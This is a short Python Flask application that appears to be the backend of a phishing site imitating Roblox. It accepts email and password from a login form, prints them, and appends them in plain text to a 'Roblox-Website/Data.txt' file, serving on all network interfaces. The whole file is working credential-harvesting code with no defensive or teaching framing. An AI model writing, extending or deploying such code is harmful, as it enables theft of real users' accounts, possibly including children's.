from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        Email, Password = request.form.get("email"), request.form.get("password")
        print(Email); print(Password)
        if Email != None and Password != None:
            DataFile = open("Roblox-Website/Data.txt", "a")
            DataFile.write(f"User: {Email} Password: {Password} \n")
            DataFile.close()
    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)